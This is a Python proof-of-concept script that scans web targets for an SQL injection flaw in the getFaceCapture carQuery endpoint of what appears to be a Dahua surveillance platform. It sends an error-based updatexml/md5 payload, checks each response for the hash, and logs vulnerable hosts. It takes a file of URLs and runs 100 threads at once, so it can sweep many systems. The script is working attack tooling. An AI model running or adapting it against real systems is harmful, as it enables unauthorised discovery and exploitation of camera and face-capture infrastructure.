import requests
import argparse
import sys,urllib3
from multiprocessing.dummy import Pool
from termcolor import colored           #导入颜色库
urllib3.disable_warnings()              #抑制警告

def banner():
    demo = """
██████╗ ██╗  ██╗      ███████╗ ██████╗ ██╗     
██╔══██╗██║  ██║      ██╔════╝██╔═══██╗██║     
██║  ██║███████║█████╗███████╗██║   ██║██║     
██║  ██║██╔══██║╚════╝╚════██║██║▄▄ ██║██║     
██████╔╝██║  ██║      ███████║╚██████╔╝███████╗
╚═════╝ ╚═╝  ╚═╝      ╚══════╝ ╚══▀▀═╝ ╚══════╝
                                               """
    colored_demo = colored(demo, 'blue')
    print(colored_demo)

def main():
    banner()
    parser = argparse.ArgumentParser(description="welcome to use!")
    parser.add_argument('-u', '--url', dest='url', type=str, help='please input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        with open(args.file, 'r', encoding='utf-8') as fp:
            url_list = [url.strip() for url in fp.readlines()]
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -u <url> or -f <file>")

def poc(target):
    payload = '/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(md5(1)),0x7e),1)--%22%7D/extend/%7B%7D'
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:128.0)Gecko/20100101Firefox/128.0',
        'Accept-Encoding':'gzip,deflate',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Connection':'close',
        'Content-Length':'0',
    }

    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=5)
        if res.status_code == 500 and '~c4ca4238a0b923820dcc509a6f75849' in res.text:
            print(f'[+]{target}存在漏洞')
            with open('result-DH.txt', 'a', encoding='utf-8') as ff:
                ff.write(f'[+]{target}存在漏洞' + '\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except Exception:
        print(f"{target}该站点存在问题!")

if __name__ == '__main__':
    main()